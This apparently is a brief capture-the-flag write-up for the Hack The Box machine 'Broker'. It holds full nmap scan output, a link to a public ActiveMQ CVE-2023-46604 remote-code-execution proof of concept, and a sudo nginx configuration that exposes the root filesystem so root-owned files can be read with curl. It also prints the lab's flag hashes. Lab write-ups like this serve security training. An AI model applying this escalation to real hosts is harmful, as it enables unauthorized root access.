+++
title = "HTB - Broker"
date = 2024-10-27
+++

```
# nmap -sV -sC -p- --open 10.10.11.243 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 12:10 EDT
Nmap scan report for 10.10.11.243
Host is up (0.13s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
44349/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.94SVN%I=7%D=10/27%Time=671E6616%P=aarch64-unknown-linu
SF:x-gnu%r(GetRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0
SF:\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x1
SF:8\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20f
SF:rom\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOpti
SF:ons,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x
SF:0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x
SF:1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x
SF:20using\x20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x0
SF:3\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\
SF:0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3
SF:\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x20unsu
SF:pported\x20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x0
SF:1\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff
SF:\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-er
SF:ror\xa17Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x2
SF:0attempted")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\
SF:0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0
SF:`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa
SF:17Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attem
SF:pted")%r(DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x
SF:19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0
SF:\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Conne
SF:ction\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%
SF:r(SSLSessionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\
SF:0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\x
SF:c0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from
SF:\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalSer
SF:verCookie,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10
SF:\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x0
SF:1\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cl
SF:ient\x20using\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.94SVN%I=7%D=10/27%Time=671E6611%P=aarch64-unknown-lin
SF:ux-gnu%r(HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknow
SF:n\x20STOMP\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stom
SF:p\.ProtocolException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20o
SF:rg\.apache\.activemq\.transport\.stomp\.ProtocolConverter\.onStompComma
SF:nd\(ProtocolConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.trans
SF:port\.stomp\.StompTransportFilter\.onCommand\(StompTransportFilter\.jav
SF:a:85\)\n\tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doC
SF:onsume\(TransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.tra
SF:nsport\.tcp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org
SF:\.apache\.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.ja
SF:va:215\)\n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61616-TCP:V=7.94SVN%I=7%D=10/27%Time=671E6611%P=aarch64-unknown-lin
SF:ux-gnu%r(NULL,140,"\0\0\x01<\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\
SF:x0c\0\x11TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCac
SF:heSize\x05\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceE
SF:nabled\x01\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x
SF:01\0\x14TightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@
SF:\0\0\0\x15MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDur
SF:ationInitalDelay\x06\0\0\0\0\0\0'\x10\0\x0fProviderVersion\t\0\x075\.15
SF:\.15");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.86 seconds
                                                  
```

Enumeration important here. Go port by port to get general idea.
ActiveMQ runinng vulnerable version on 61616
Github POC https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell
Once you've got RCE, set up another listener and spawn stable shell
USER:31e90a167b91bc408af59d9547b0fae0
We can run nginx as sudo. So, per 0xdf, let's create a malicious web server.
Create a configuration file for our server (Read about this):
```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```
Then, save it as `li0t.conf`. 
Run `sudo /usr/sbin/nginx -c /dev/shm/li0t.conf` to start the server.
Query with `curl localhost:1337/root/root.txt` to get information
ROOT:5471f3bccb4e8d7964d77831fbae2717
